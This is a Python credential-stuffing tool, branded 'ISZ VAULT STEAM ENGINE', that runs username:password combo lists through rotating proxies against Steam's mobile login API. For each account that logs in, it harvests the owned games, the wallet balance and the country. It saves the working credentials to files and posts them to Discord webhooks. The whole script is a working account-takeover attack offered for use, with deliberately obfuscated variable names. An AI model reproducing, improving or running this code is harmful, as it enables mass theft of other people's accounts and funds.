import requests
import base64
import json
import os
import sys
import re
import time
import random
import struct
import urllib.parse as baro_enc
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from datetime import datetime

# Cores estilo terminal
class C:
    R = '\033[38;5;196m' 
    G = '\033[38;5;46m' 
    Y = '\033[38;5;226m' 
    B = '\033[38;5;33m' 
    M = '\033[38;5;201m' 
    CY = '\033[38;5;51m' 
    W = '\033[97m'
    D = '\033[90m'
    X = '\033[0m'
    P = '\033[38;5;205m'
    PU = '\033[38;5;135m'
    BOLD = '\033[1m'

if sys.platform == "win32":
    os.system("chcp 65001 >nul 2>&1")
    sys.stdout.reconfigure(encoding="utf-8", errors="ignore")

baro_st = {"hit": 0, "2fa": 0, "bad": 0, "free": 0, "ban": 0, "err": 0, "done": 0, "_total": 0}
_brn_lk = Lock()
baron_t0 = 0.0

BRN_MAP = {
 "AF": "Afghanistan", "AX": "Aland Islands", "AL": "Albania", "DZ": "Algeria",
 "AS": "American Samoa", "AD": "Andorra", "AO": "Angola", "AI": "Anguilla",
 "AG": "Antigua and Barbuda", "AR": "Argentina", "AM": "Armenia", "AW": "Aruba",
 "AU": "Australia", "AT": "Austria", "AZ": "Azerbaijan", "BS": "Bahamas",
 "BH": "Bahrain", "BD": "Bangladesh", "BB": "Barbados", "BY": "Belarus",
 "BE": "Belgium", "BZ": "Belize", "BJ": "Benin", "BM": "Bermuda",
 "BT": "Bhutan", "BO": "Bolivia", "BA": "Bosnia and Herzegovina", "BW": "Botswana",
 "BR": "Brazil", "BN": "Brunei", "BG": "Bulgaria", "BF": "Burkina Faso",
 "BI": "Burundi", "KH": "Cambodia", "CM": "Cameroon", "CA": "Canada",
 "CV": "Cape Verde", "KY": "Cayman Islands", "CF": "Central African Republic",
 "TD": "Chad", "CL": "Chile", "CN": "China", "CO": "Colombia",
 "KM": "Comoros", "CG": "Congo", "CD": "DR Congo", "CK": "Cook Islands",
 "CR": "Costa Rica", "CI": "Cote d'Ivoire", "HR": "Croatia", "CU": "Cuba",
 "CW": "Curacao", "CY": "Cyprus", "CZ": "Czech Republic", "DK": "Denmark",
 "DJ": "Djibouti", "DM": "Dominica", "DO": "Dominican Republic", "EC": "Ecuador",
 "EG": "Egypt", "SV": "El Salvador", "GQ": "Equatorial Guinea", "ER": "Eritrea",
 "EE": "Estonia", "ET": "Ethiopia", "FK": "Falkland Islands", "FO": "Faroe Islands",
 "FJ": "Fiji", "FI": "Finland", "FR": "France", "GF": "French Guiana",
 "PF": "French Polynesia", "GA": "Gabon", "GM": "Gambia", "GE": "Georgia",
 "DE": "Germany", "GH": "Ghana", "GI": "Gibraltar", "GR": "Greece",
 "GL": "Greenland", "GD": "Grenada", "GP": "Guadeloupe", "GU": "Guam",
 "GT": "Guatemala", "GG": "Guernsey", "GN": "Guinea", "GW": "Guinea-Bissau",
 "GY": "Guyana", "HT": "Haiti", "VA": "Vatican", "HN": "Honduras",
 "HK": "Hong Kong", "HU": "Hungary", "IS": "Iceland", "IN": "India",
 "ID": "Indonesia", "IR": "Iran", "IQ": "Iraq", "IE": "Ireland",
 "IM": "Isle of Man", "IL": "Israel", "IT": "Italy", "JM": "Jamaica",
 "JP": "Japan", "JE": "Jersey", "JO": "Jordan", "KZ": "Kazakhstan",
 "KE": "Kenya", "KI": "Kiribati", "KP": "North Korea", "KR": "South Korea",
 "KW": "Kuwait", "KG": "Kyrgyzstan", "LA": "Laos", "LV": "Latvia",
 "LB": "Lebanon", "LS": "Lesotho", "LR": "Liberia", "LY": "Libya",
 "LI": "Liechtenstein", "LT": "Lithuania", "LU": "Luxembourg", "MO": "Macao",
 "MK": "North Macedonia", "MG": "Madagascar", "MW": "Malawi", "MY": "Malaysia",
 "MV": "Maldives", "ML": "Mali", "MT": "Malta", "MH": "Marshall Islands",
 "MQ": "Martinique", "MR": "Mauritania", "MU": "Mauritius", "YT": "Mayotte",
 "MX": "Mexico", "FM": "Micronesia", "MD": "Moldova", "MC": "Monaco",
 "MN": "Mongolia", "ME": "Montenegro", "MS": "Montserrat", "MA": "Morocco",
 "MZ": "Mozambique", "MM": "Myanmar", "NA": "Namibia", "NR": "Nauru",
 "NP": "Nepal", "NL": "Netherlands", "NC": "New Caledonia", "NZ": "New Zealand",
 "NI": "Nicaragua", "NE": "Niger", "NG": "Nigeria", "NU": "Niue",
 "NF": "Norfolk Island", "MP": "N. Mariana Islands", "NO": "Norway", "OM": "Oman",
 "PK": "Pakistan", "PW": "Palau", "PS": "Palestine", "PA": "Panama",
 "PG": "Papua New Guinea", "PY": "Paraguay", "PE": "Peru", "PH": "Philippines",
 "PL": "Poland", "PT": "Portugal", "PR": "Puerto Rico", "QA": "Qatar",
 "RE": "Reunion", "RO": "Romania", "RU": "Russia", "RW": "Rwanda",
 "SA": "Saudi Arabia", "SN": "Senegal", "RS": "Serbia", "SC": "Seychelles",
 "SL": "Sierra Leone", "SG": "Singapore", "SX": "Sint Maarten", "SK": "Slovakia",
 "SI": "Slovenia", "SB": "Solomon Islands", "SO": "Somalia", "ZA": "South Africa",
 "SS": "South Sudan", "ES": "Spain", "LK": "Sri Lanka", "SD": "Sudan",
 "SR": "Suriname", "SZ": "Eswatini", "SE": "Sweden", "CH": "Switzerland",
 "SY": "Syria", "TW": "Taiwan", "TJ": "Tajikistan", "TZ": "Tanzania",
 "TH": "Thailand", "TL": "Timor-Leste", "TG": "Togo", "TO": "Tonga",
 "TT": "Trinidad and Tobago", "TN": "Tunisia", "TR": "Turkey", "TM": "Turkmenistan",
 "TC": "Turks and Caicos", "TV": "Tuvalu", "UG": "Uganda", "UA": "Ukraine",
 "AE": "UAE", "GB": "United Kingdom", "US": "United States", "UY": "Uruguay",
 "UZ": "Uzbekistan", "VU": "Vanuatu", "VE": "Venezuela", "VN": "Vietnam",
 "VG": "British Virgin Islands", "VI": "US Virgin Islands", "WF": "Wallis and Futuna",
 "EH": "Western Sahara", "YE": "Yemen", "ZM": "Zambia", "ZW": "Zimbabwe",
}

def brn_vi(v):
 if v < 0:
     v &= 0xffffffffffffffff
 baron_buf = bytearray()
 while v > 0x7f:
     baron_buf.append(0x80 | (v & 0x7f))
     v >>= 7
 baron_buf.append(v & 0x7f)
 return bytes(baron_buf)

def brn_rvi(baro_b, baro_p):
 brn_r = brn_s = 0
 while baro_p < len(baro_b):
     bron_x = baro_b[baro_p]; baro_p += 1
     brn_r |= (bron_x & 0x7f) << brn_s
     if not (bron_x & 0x80):
         break
     brn_s += 7
 return brn_r, baro_p

def baro_ps(baron_fn, bron_s):
 baro_d = bron_s.encode() if isinstance(bron_s, str) else bron_s
 return brn_vi((baron_fn << 3) | 2) + brn_vi(len(baro_d)) + baro_d

def baro_pr(baron_fn, bron_d):
 return brn_vi((baron_fn << 3) | 2) + brn_vi(len(bron_d)) + bron_d

def baro_pi(baron_fn, bron_v):
 return brn_vi(baron_fn << 3) + brn_vi(bron_v if bron_v >= 0 else bron_v & 0xffffffffffffffff)

def baron_pd(baron_raw):
 baro_out = {}
 brn_p = 0
 while brn_p < len(baron_raw):
     try:
         baro_tag, brn_p = brn_rvi(baron_raw, brn_p)
     except:
         break
     baron_fn = baro_tag >> 3
     bron_wt = baro_tag & 7
     if baron_fn < 1: break
     if bron_wt == 0:
         baro_val, brn_p = brn_rvi(baron_raw, brn_p)
         brn_prev = baro_out.get(baron_fn)
         if brn_prev is not None:
             baro_out[baron_fn] = [brn_prev, baro_val] if not isinstance(brn_prev, list) else brn_prev + [baro_val]
         else:
             baro_out[baron_fn] = baro_val
     elif bron_wt == 2:
         baro_ln, brn_p = brn_rvi(baron_raw, brn_p)
         if brn_p + baro_ln > len(baron_raw): break
         baron_chunk = baron_raw[brn_p:brn_p + baro_ln]
         brn_p += baro_ln
         brn_prev = baro_out.get(baron_fn)
         if brn_prev is not None:
             baro_out[baron_fn] = [brn_prev, baron_chunk] if not isinstance(brn_prev, list) else brn_prev + [baron_chunk]
         else:
             baro_out[baron_fn] = baron_chunk
     elif bron_wt == 5:
         if brn_p + 4 > len(baron_raw): break
         baro_out[baron_fn] = struct.unpack_from('<I', baron_raw, brn_p)[0]; brn_p += 4
     elif bron_wt == 1:
         if brn_p + 8 > len(baron_raw): break
         baro_out[baron_fn] = struct.unpack_from('<Q', baron_raw, brn_p)[0]; brn_p += 8
     else:
         break
 return baro_out

def bron_rsa(baro_pw, brn_mod, brn_exp):
 baron_mb = bytes.fromhex(brn_mod)
 baro_n = int.from_bytes(baron_mb, 'big')
 brn_e = int(brn_exp, 16)
 bron_pw = baro_pw.encode()
 baron_k = len(baron_mb)
 baro_fill = baron_k - len(bron_pw) - 3
 brn_pad = bytes(random.randint(1, 255) for _ in range(baro_fill))
 baron_block = b'\x00\x02' + brn_pad + b'\x00' + bron_pw
 baro_m = int.from_bytes(baron_block, 'big')
 brn_c = pow(baro_m, brn_e, baro_n)
 return base64.b64encode(brn_c.to_bytes(baron_k, 'big')).decode()

BRN_BNDRY = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
BARON_CT = f"multipart/form-data; boundary={BRN_BNDRY}"

def brn_mp(baro_k, baron_v):
 return (
     f"------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n"
     f"Content-Disposition: form-data; name=\"{baro_k}\"\r\n\r\n"
     f"{baron_v}\r\n"
     f"------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n"
 ).encode()

BARO_UA = "okhttp/4.9.2"
BRN_H = {
 "Accept": "application/json, text/plain, */*",
 "Accept-Encoding": "gzip",
 "Connection": "Keep-Alive",
 "User-Agent": BARO_UA,
}

def send_discord_webhook(url, embed_data):
    """Envia uma requisição POST para o webhook do Discord"""
    payload = { "embeds": [embed_data] }
    try:
        requests.post(url, json=payload, timeout=5)
    except:
        pass

def baron_check(baro_user, baro_pw, bron_proxy=None):
 brn_s = requests.Session()
 brn_s.headers.update(BRN_H)
 brn_s.headers["Cookie"] = "Steam_Language=english"
 if bron_proxy:
     brn_s.proxies = {"http": bron_proxy, "https": bron_proxy}

 try:
     baron_pb = baro_ps(1, baro_user)
     brn_enc = baro_enc.quote(base64.b64encode(baron_pb).decode())
     baro_r = brn_s.get(
         "https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1"
         f"?origin=SteamMobile&input_protobuf_encoded={brn_enc}",
         timeout=15,
     )
     if baro_r.status_code != 200:
         return {"st": "err", "info": f"rsa:{baro_r.status_code}"}

     bron_rsa_d = baron_pd(baro_r.content)
     baron_mod = bron_rsa_d.get(1, b"")
     baro_exp = bron_rsa_d.get(2, b"")
     brn_ts = bron_rsa_d.get(3, 0)
     if isinstance(baron_mod, bytes): baron_mod = baron_mod.decode()
     if isinstance(baro_exp, bytes): baro_exp = baro_exp.decode()
     if not baron_mod or not baro_exp:
         return {"st": "err", "info": "rsa key empty"}

     bron_epw = bron_rsa(baro_pw, baron_mod, baro_exp)

     baron_dev = baro_ps(1, "SM-S256B") + baro_pi(2, 3) + baro_pi(3, -500) + baro_pi(4, 1)
     brn_auth = (
         baro_ps(2, baro_user) + baro_ps(3, bron_epw) + baro_pi(4, brn_ts) +
         baro_pi(5, 1) + baro_pi(7, 1) + baro_ps(8, "Mobile") +
         baro_pr(9, baron_dev) + baro_pi(11, 0)
     )
     baro_b64 = base64.b64encode(brn_auth).decode()

     baro_r = brn_s.post(
         "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1",
         data=brn_mp("input_protobuf_encoded", baro_b64),
         headers={"Content-Type": BARON_CT},
         timeout=15,
     )

     baron_er = 0
     try: baron_er = int(baro_r.headers.get("X-eresult", "0"))
     except: pass

     if baron_er in (5, 2):
         return {"st": "bad"}
     if baron_er in (63, 43):
         return {"st": "ban"}
     if baron_er != 1:
         return {"st": "err", "info": f"eresult={baron_er}"}

     brn_ar = baron_pd(baro_r.content)
     baro_cid = brn_ar.get(1, 0)
     baron_rid = brn_ar.get(2, b"")
     bron_sid = brn_ar.get(5, 0)

     baro_confs = brn_ar.get(4, [])
     if isinstance(baro_confs, bytes): baro_confs = [baro_confs]
     elif not isinstance(baro_confs, list): baro_confs = []

     brn_ctypes = []
     for baron_cf in baro_confs:
         if isinstance(baron_cf, bytes):
             baro_parsed = baron_pd(baron_cf)
             brn_ct = baro_parsed.get(1, 0)
             if isinstance(brn_ct, list):
                 brn_ctypes.extend(brn_ct)
             else:
                 brn_ctypes.append(brn_ct)

     baron_has2fa = any(baro_t in (2, 3, 4, 5, 6) for baro_t in brn_ctypes)

     if baron_has2fa:
         return {
             "st": "2fa", "sid": str(bron_sid),
             "types": ",".join(str(baro_t) for baro_t in brn_ctypes),
         }

     brn_poll = baro_pi(1, baro_cid) + baro_pr(2, baron_rid)
     bron_b64 = base64.b64encode(brn_poll).decode()

     baro_r = brn_s.post(
         "https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1",
         data=brn_mp("input_protobuf_encoded", bron_b64),
         headers={"Content-Type": BARON_CT, "Accept-Encoding": "identity"},
         timeout=15,
     )

     baron_pr_d = baron_pd(baro_r.content)
     brn_tk = baron_pr_d.get(4, b"")
     if isinstance(brn_tk, bytes): brn_tk = brn_tk.decode("utf-8", errors="ignore")
     if not brn_tk:
         return {"st": "err", "info": "poll: no token"}

     baro_parts = brn_tk.split(".")
     if len(baro_parts) < 2:
         return {"st": "err", "info": "bad jwt"}
     baron_payload = baro_parts[1]
     bron_rem = len(baron_payload) % 4
     if bron_rem: baron_payload += "=" * (4 - bron_rem)
     try:
         brn_jwt = json.loads(base64.urlsafe_b64decode(baron_payload))
     except:
         brn_jwt = {}
     baron_steamid = str(brn_jwt.get("sub", bron_sid))
     baro_sid_int = int(baron_steamid)

     baron_ck = (
         f"Steam_Language=english; "
         f"steamLoginSecure={baron_steamid}%7C%7C{baro_enc.quote(brn_tk)}; "
         f"mobileClient=android; mobileClientVersion=777777 3.10.9"
     )

     brn_res = {
         "st": "hit", "sid": baron_steamid,
         "country": "", "cc": "", "level": "",
         "games": 0, "balance": "", "game_list": [],
     }

     try:
         baro_cpb = struct.pack('<BQ', 0x09, baro_sid_int)
         baro_r = brn_s.post(
             f"https://api.steampowered.com/IUserAccountService/GetUserCountry/v1"
             f"?access_token={brn_tk}&spoof_steamid=",
             data=brn_mp("input_protobuf_encoded", base64.b64encode(baro_cpb).decode()),
             headers={"Content-Type": BARON_CT}, timeout=10,
         )
         baron_cr = baron_pd(baro_r.content)
         bron_cc = baron_cr.get(1, b"")
         if isinstance(bron_cc, bytes): bron_cc = bron_cc.decode()
         brn_res["cc"] = bron_cc
         brn_res["country"] = BRN_MAP.get(bron_cc, bron_cc)
     except: pass

     try:
         baron_gpb = (baro_pi(1, baro_sid_int) + baro_pi(2, 1) + baro_pi(3, 1) +
                      baro_pi(6, 0) + baro_ps(7, "english") + baro_pi(8, 1))
         brn_gb64 = baro_enc.quote(base64.b64encode(baron_gpb).decode())
         brn_s.headers["Cookie"] = baron_ck
         baro_r = brn_s.get(
             f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v1"
             f"?access_token={brn_tk}&spoof_steamid=&origin=SteamMobile"
             f"&input_protobuf_encoded={brn_gb64}",
             timeout=10,
         )
         baron_gr = baron_pd(baro_r.content)
         brn_res["games"] = baron_gr.get(1, 0)
         baro_rawg = baron_gr.get(2, [])
         if isinstance(baro_rawg, bytes): baro_rawg = [baro_rawg]
         elif not isinstance(baro_rawg, list): baro_rawg = []
         baron_gnames = []
         for bron_g in baro_rawg:
             try:
                 if not isinstance(bron_g, bytes): continue
                 baro_gf = baron_pd(bron_g)
                 brn_nm = baro_gf.get(2, b"")
                 if isinstance(brn_nm, bytes): brn_nm = brn_nm.decode(errors="replace")
                 if isinstance(brn_nm, str) and brn_nm.strip(): baron_gnames.append(brn_nm.strip())
             except: continue
         brn_res["game_list"] = baron_gnames
     except: pass

     try:
         baro_mpid = baro_sid_int - 76561197960265728
         brn_s.headers["Cookie"] = baron_ck
         baro_r = brn_s.get(f"https://steamcommunity.com/miniprofile/{baro_mpid}/json", timeout=10)
         try:
             baron_mpj = baro_r.json()
             brn_lv = baron_mpj.get("level", baron_mpj.get("player_level", ""))
             brn_res["level"] = str(brn_lv) if brn_lv != "" else ""
         except:
             baro_m = re.search(r'friendPlayerLevel\s+(\S+)', baro_r.text)
             if baro_m: brn_res["level"] = baro_m.group(1)
     except: pass

     try:
         baro_r = brn_s.post(
             f"https://api.steampowered.com/IUserAccountService/GetClientWalletDetails/v1"
             f"?access_token={brn_tk}&spoof_steamid=",
             data=brn_mp("input_protobuf_encoded", "GAE="),
             headers={"Content-Type": BARON_CT}, timeout=10,
         )
         baron_wr = baron_pd(baro_r.content)
         bron_bal = baron_wr.get(14, b"")
         if isinstance(bron_bal, bytes):
             bron_bal = bron_bal.decode("utf-8", errors="ignore")
         elif isinstance(bron_bal, int):
             bron_bal = str(bron_bal)
         brn_res["balance"] = bron_bal
     except: pass

     return brn_res

 except requests.exceptions.ProxyError:
     return {"st": "err", "info": "proxy dead"}
 except requests.exceptions.Timeout:
     return {"st": "err", "info": "timeout"}
 except requests.exceptions.ConnectionError:
     return {"st": "err", "info": "conn failed"}
 except Exception as baron_exc:
     return {"st": "err", "info": str(baron_exc)[:80]}

def baro_retry(baro_user, baro_pw, bron_proxy=None, brn_tries=2):
 for baron_i in range(brn_tries + 1):
     baro_res = baron_check(baro_user, baro_pw, bron_proxy)
     if baro_res["st"] != "ban": return baro_res
     if baron_i < brn_tries: time.sleep(3 + random.random() * 2)
 return baro_res

def print_status():
 global baron_t0
 elapsed = time.time() - baron_t0
 cpm = int((baro_st['done'] / elapsed) * 60) if elapsed > 0 else 0
 sys.stdout.write(f"\r {C.M}⚠ STATUS //{C.X} {C.CY}SCAN: {baro_st['done']}/{baro_st['_total']}{C.X} | {C.G}HIT: {baro_st['hit']}{C.X} | {C.Y}2FA: {baro_st['2fa']}{C.X} | {C.W}FREE: {baro_st['free']}{C.X} | {C.R}BAD: {baro_st['bad']}{C.X} | {C.P}ERR: {baro_st['ban']+baro_st['err']}{C.X} | {C.B}CPM: {cpm}{C.X} \033[K")
 sys.stdout.flush()

def brn_log(baro_user, baro_pw, baron_res, brn_files, valid_wh_url, fa2_wh_url):
 baro_combo = f"{baro_user}:{baro_pw}"
 bron_st = baron_res["st"]
 with _brn_lk:
     baro_st["done"] += 1
     sys.stdout.write("\r\033[K")
     
     # --- LOGICA DE WEBHOOKS ---
     
     if bron_st == "hit":
         baro_st["hit"] += 1
         baron_glist = baron_res.get("game_list", [])
         brn_gstr = ", ".join(baron_glist[:10]) # Limita a 10 jogos pra não estourar o embed
         if len(baron_glist) > 10:
             brn_gstr += f" ... (+{len(baron_glist)-10} mais)"
             
         baro_cap = (f"**🆔 ID**: `{baron_res['sid']}`\n"
                     f"**🎮 Jogos**: `{baron_res.get('games', 0)}`\n"
                     f"**💰 Wallet**: `{baron_res.get('balance') or 'N/A'}`\n"
                     f"**🌍 País**: `{baron_res.get('country') or baron_res.get('cc', '?')}`\n"
                     f"**📜 Lista de Jogos**: `{brn_gstr}`")

         print(f"{C.BOLD}{C.G}[✔] SUCCESS HIT ✔{C.X} {C.W}{baro_combo}{C.X}")
         print(f"{C.P} •──[🕹️] INFO:{C.X} {C.CY}{baro_cap}{C.X}")
         print(f"{C.P} •──[🎮] GAMES:{C.X} {C.W}{brn_gstr}{C.X}")
         
         # Salva arquivo
         brn_files["hits"].write(f"{baro_combo} | {baro_cap} | Games: {brn_gstr} | @iszvault_XVI\n"); brn_files["hits"].flush()

         # Envia Webhook
         embed = {
             "title": "✅ STEAM HIT VALIDADO!",
             "description": baro_cap,
             "color": 57637, # Verde
             "footer": { "text": f"@iszvault_XVI | {baro_combo}" },
             "timestamp": datetime.now(datetime.timezone.utc).isoformat()

         }
         send_discord_webhook(valid_wh_url, embed)

     elif bron_st == "2fa":
         baro_st["2fa"] += 1
         baron_info = f"SteamID: {baron_res.get('sid', '?')} | 2FA: {baron_res.get('types', '?')}"
         print(f"{C.BOLD}{C.Y}[!] 2FA LOCKED ✔{C.X} {C.W}{baro_combo}{C.X} | {C.CY}{baron_info}{C.X}")
         brn_files["2fa"].write(f"{baro_combo} | {baron_info} | @iszvault_XVI\n"); brn_files["2fa"].flush()

         # Envia Webhook de 2FA (Diferente)
         embed_2fa = {
             "title": "🔒 2FA DETECTADO",
             "description": f"**Combo**: `{baro_combo}`\n**ID**: `{baron_res.get('sid', '?')}`\n**Tipo**: `{baron_res.get('types', '?')}`",
             "color": 16776960, # Amarelo/Laranja
             "footer": { "text": "@iszvault_XVI" },
             "timestamp": datetime.utcnow().isoformat()
         }
         send_discord_webhook(fa2_wh_url, embed_2fa)

     elif bron_st == "free":
         baro_st["free"] += 1
         baro_cap = (f"SteamID: {baron_res['sid']} | Lvl: {baron_res.get('level') or '?'} | "
                     f"Games: 0 | Country: {baron_res.get('country') or '?'}")
         print(f"{C.BOLD}{C.CY}[*] FREE ACC ✔{C.X} {C.W}{baro_combo}{C.X} | {C.CY}{baro_cap}{C.X}")
         brn_files["free"].write(f"{baro_combo} | {baro_cap} | @iszvault_XVI\n"); brn_files["free"].flush()

     elif bron_st == "bad":
         baro_st["bad"] += 1

     elif bron_st == "ban":
         baro_st["ban"] += 1

     else:
         baro_st["err"] += 1
 
     print_status()

def bron_px(baron_raw):
 baron_raw = baron_raw.strip()
 if not baron_raw: return None
 if baron_raw.startswith(("http://", "https://", "socks4://", "socks5://")):
     return baron_raw
 baro_pts = baron_raw.split(":")
 if len(baro_pts) == 4:
     return f"http://{baro_pts[2]}:{baro_pts[3]}@{baro_pts[0]}:{baro_pts[1]}"
 if len(baro_pts) == 2:
     return f"http://{baro_pts[0]}:{baro_pts[1]}"
 return f"http://{baron_raw}"

def baron_run():
 global baron_t0
 os.system("clear" if os.name != "nt" else "cls")
 
 print(f"""{C.BOLD}{C.CY}
┌─────────────────────────────────────────────┐
│ ─────────── ─── ─── ─── │
│ ───┴───────┴───────┴───────┴───────┴───────┤
│ ─────── ─── ────────────────────────────────│
│ ─────── ─── ┴─────── ┴───────┴───────┴───────│
│ ─────────── ─── ┴───────┴───────┴───────┴── │
│ ────────┴───────┴───────┴───────┴───────┴── │
│ ────────────────────────────────────────────│
└─────────────────────────────────────────────┘
 {C.P}[»»] ISZ VAULT STEAM ENGINE - @iszvault_XVI [««]{C.X}
 """)

 baro_combo_path = input(f" {C.CY}⚠ Combo File Path ✔ {C.X}").strip()
 if not os.path.isfile(baro_combo_path):
     print(f"\n {C.R}[!] File not found.{C.X}\n"); return

 baron_proxy_path = input(f" {C.CY}⚠ Proxy File (Blank = Direct) ✔ {C.X}").strip()
 brn_threads = int(input(f" {C.CY}⚠ Threads [10] ✔ {C.X}").strip() or "10")

 # Novos inputs para Webhooks
 valid_webhook = input(f" {C.G}🔗 Discord Webhook (VALID/HITS){C.X} ").strip()
 fa2_webhook = input(f" {C.Y}🔗 Discord Webhook (2FA ALERTS){C.X} ").strip()

 baro_pairs = []
 with open(baro_combo_path, "r", errors="ignore") as baron_f:
     for brn_ln in baron_f:
         brn_ln = brn_ln.strip()
         if ":" in brn_ln:
             baro_u, bron_p = brn_ln.split(":", 1)
             if baro_u.strip() and bron_p.strip():
                 baro_pairs.append((baro_u.strip(), bron_p.strip()))

 if not baro_pairs:
     print(f"\n {C.R}[!] Combo file is empty.{C.X}\n"); return

 baron_pxlist = []
 if baron_proxy_path and os.path.isfile(baron_proxy_path):
     baron_pxlist = [bron_px(baro_l) for baro_l in open(baron_proxy_path) if baro_l.strip()]
     baron_pxlist = [brn_p for brn_p in baron_pxlist if brn_p]

 baro_st["_total"] = len(baro_pairs)
 print(f"\n {C.G}[+] Loaded {len(baro_pairs)} Combos and {len(baron_pxlist)} Proxies on {brn_threads} Threads.{C.X}\n")

 os.makedirs("output", exist_ok=True)
 baron_tag = datetime.now().strftime("%Y%m%d_%H%M%S")
 brn_files = {
     "hits": open(f"output/steam_hits_{baron_tag}.txt", "a", encoding="utf-8"),
     "2fa": open(f"output/steam_2fa_{baron_tag}.txt", "a", encoding="utf-8"),
     "free": open(f"output/steam_free_{baron_tag}.txt", "a", encoding="utf-8"),
 }

 baro_pxi = [0]
 baron_pxlk = Lock()
 def brn_nextpx():
     if not baron_pxlist: return None
     with baron_pxlk:
         baro_p = baron_pxlist[baro_pxi[0] % len(baron_pxlist)]
         baro_pxi[0] += 1
         return baro_p

 baron_t0 = time.time()
 try:
     with ThreadPoolExecutor(max_workers=brn_threads) as baro_pool:
         brn_futs = {baro_pool.submit(baro_retry, baro_u, bron_p, brn_nextpx()): (baro_u, bron_p) for baro_u, bron_p in baro_pairs}
         for baron_fut in as_completed(brn_futs):
             baro_u, bron_p = brn_futs[baron_fut]
             try: baro_res = baron_fut.result()
             except Exception as brn_e: baro_res = {"st": "err", "info": str(brn_e)[:60]}
             
             # Passa os webhooks para a função de log
             brn_log(baro_u, bron_p, baro_res, brn_files, valid_webhook, fa2_webhook)
 finally:
     for baron_f in brn_files.values(): baron_f.close()

 sys.stdout.write("\r\033[K")
 bron_elapsed = time.time() - baron_t0
 print(f"\n\n{C.CY}┌─────────────────────────────────────────────┐")
 print(f"│ 📊 SESSION COMPLETED │")
 print(f"├─────────────────────────────────────────────┤")
 print(f"│ {C.G}[+] SUCCESS HITS: {C.X} {str(baro_st['hit']):<38} {C.CY}│")
 print(f"│ {C.Y}[!] 2FA SECURED: {C.X} {str(baro_st['2fa']):<38} {C.CY}│")
 print(f"│ {C.CY}[*] FREE ACCOUNTS: {C.X} {str(baro_st['free']):<38} {C.CY}│")
 print(f"│ {C.R}[-] BAD LOGINS: {C.X} {str(baro_st['bad']):<38} {C.CY}│")
 print(f"│ {C.P}[?] BANNED / ERROR: {C.X} {str(baro_st['ban'] + baro_st['err']):<38} {C.CY}│")
 print(f"│ {C.W}[⏱] DURATION: {C.X} {time.strftime('%H:%M:%S', time.gmtime(bron_elapsed)):<38} {C.CY}│")
 print(f"├─────────────────────────────────────────────┤")
 print(f"│ {C.CY}[📂] RESULTS SAVED TO output/ FOLDER │")
 print(f"└─────────────────────────────────────────────┘{C.X}\n")

if __name__ == "__main__":
 baron_run()